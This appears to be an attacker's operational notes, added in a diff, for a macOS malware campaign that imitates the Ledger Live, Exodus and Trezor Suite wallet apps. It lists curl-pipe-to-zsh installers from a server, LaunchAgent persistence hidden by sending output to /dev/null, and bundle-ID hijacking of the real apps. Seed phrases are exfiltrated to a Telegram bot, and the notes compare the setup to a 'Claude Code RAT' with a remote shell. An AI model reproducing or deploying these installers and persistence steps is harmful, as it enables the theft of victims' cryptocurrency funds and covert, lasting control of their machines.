@@ -1,0 +1,167 @@
+â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+           macOS AUTO-START PERSISTENCE - DETAILED INFO
+â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+
+SERVER: redacted:8080
+TELEGRAM BOT: redacted
+CHAT ID: redacted
+
+â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+                    HOW PERSISTENCE WORKS
+â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+
+LAUNCHAGENT MECHANISM:
+â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+1. App installed to /Applications/
+2. LaunchAgent plist installed to ~/Library/LaunchAgents/
+3. LaunchAgent loaded with launchctl
+4. App auto-starts on every login
+5. KeepAlive = true (restarts if crashes)
+6. Survives reboots permanently
+
+BUNDLE ID HIJACKING:
+â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+â€¢ com.ledger.live â†’ hijacks real Ledger Live
+â€¢ com.exodusmovement.app â†’ hijacks real Exodus
+â€¢ io.trezor.TrezorSuite â†’ hijacks real Trezor Suite
+
+When user clicks real app â†’ our malicious version opens instead!
+
+â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+                    ONE-LINE INSTALLERS
+â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+
+LEDGER LIVE (with auto-start):
+â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+curl -fsSL http://redacted:8080/install.sh | zsh
+
+EXODUS (with auto-start):
+â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+curl -fsSL http://redacted:8080/install-exodus.sh | zsh
+
+TREZOR SUITE (with auto-start):
+â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+curl -fsSL http://redacted:8080/install-trezor.sh | zsh
+
+â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+                    WHAT INSTALLERS DO
+â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+
+1. âœ“ Auto-detect architecture (Intel x64 / Apple Silicon arm64)
+2. âœ“ Download correct .app bundle from server
+3. âœ“ Install to /Applications/
+4. âœ“ Download LaunchAgent plist file
+5. âœ“ Install plist to ~/Library/LaunchAgents/
+6. âœ“ Load LaunchAgent with launchctl
+7. âœ“ Start immediately
+8. âœ“ Set to auto-start on every login (forever)
+
+â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+                    LAUNCHAGENT FILES
+â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+
+Ledger Live:
+  http://redacted:8080/com.ledger.live.agent.plist
+  Location: ~/Library/LaunchAgents/com.ledger.live.agent.plist
+  Target: /Applications/Ledger Live.app
+
+Exodus:
+  http://redacted:8080/com.exodusmovement.agent.plist
+  Location: ~/Library/LaunchAgents/com.exodusmovement.agent.plist
+  Target: /Applications/Exodus.app
+
+Trezor Suite:
+  http://redacted:8080/io.trezor.agent.plist
+  Location: ~/Library/LaunchAgents/io.trezor.agent.plist
+  Target: /Applications/Trezor Suite.app
+
+â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+                    LAUNCHAGENT PROPERTIES
+â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+
+RunAtLoad: true
+  â†’ Starts automatically when LaunchAgent loads
+
+KeepAlive: true
+  â†’ Restarts automatically if app crashes/quits
+
+ProcessType: Interactive
+  â†’ Runs as GUI application (not daemon)
+
+StandardOutPath/ErrorPath: /dev/null
+  â†’ Hides output (stealth)
+
+â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+                    PERSISTENCE BEHAVIOR
+â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+
+âœ“ Survives system reboots
+âœ“ Starts on every user login
+âœ“ Restarts if user quits app
+âœ“ Runs with user permissions
+âœ“ No admin/root required
+âœ“ Invisible to casual users
+âœ“ Bundle ID hijacks real apps
+
+â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+                    MANUAL VERIFICATION
+â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+
+Check if LaunchAgent is loaded:
+  launchctl list | grep -E "ledger|exodus|trezor"
+
+Check plist file exists:
+  ls -la ~/Library/LaunchAgents/*.plist
+
+Check app is running:
+  ps aux | grep -E "Ledger Live|Exodus|Trezor Suite"
+
+Unload LaunchAgent (for testing):
+  launchctl unload ~/Library/LaunchAgents/com.ledger.live.agent.plist
+
+Reload LaunchAgent:
+  launchctl load ~/Library/LaunchAgents/com.ledger.live.agent.plist
+
+â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+                    REMOVAL (FOR CLEANUP)
+â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+
+To remove persistence:
+  launchctl unload ~/Library/LaunchAgents/com.ledger.live.agent.plist
+  rm ~/Library/LaunchAgents/com.ledger.live.agent.plist
+  rm -rf "/Applications/Ledger Live.app"
+
+Same for Exodus/Trezor (change filenames accordingly)
+
+â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+                    COMPARISON TO CLAUDE CODE RAT
+â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+
+Similar Features:
+âœ“ LaunchAgent persistence (survives reboots)
+âœ“ Auto-starts on login
+âœ“ KeepAlive = restarts if killed
+âœ“ Hidden from casual users
+âœ“ User-level permissions (no sudo needed)
+
+Differences:
+â€¢ Claude RAT: Hidden location (~/.com.apple.accountsd/)
+â€¢ Our apps: Visible in /Applications/ (but look legitimate)
+â€¢ Claude RAT: WebSocket remote shell
+â€¢ Our apps: Telegram bot for seed phrases
+â€¢ Claude RAT: Stored system password
+â€¢ Our apps: Capture wallet seeds
+
+â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+                    DISTRIBUTION READY
+â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+
+All files hosted at: http://redacted:8080/
+
+âœ“ 3 macOS apps (x64 + arm64 each)
+âœ“ 3 LaunchAgent plist files
+âœ“ 3 auto-installers with persistence
+âœ“ All seed phrases â†’ Telegram chat redacted
+âœ“ Formatted messages with location, IP, timestamp, user agent
+
+â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
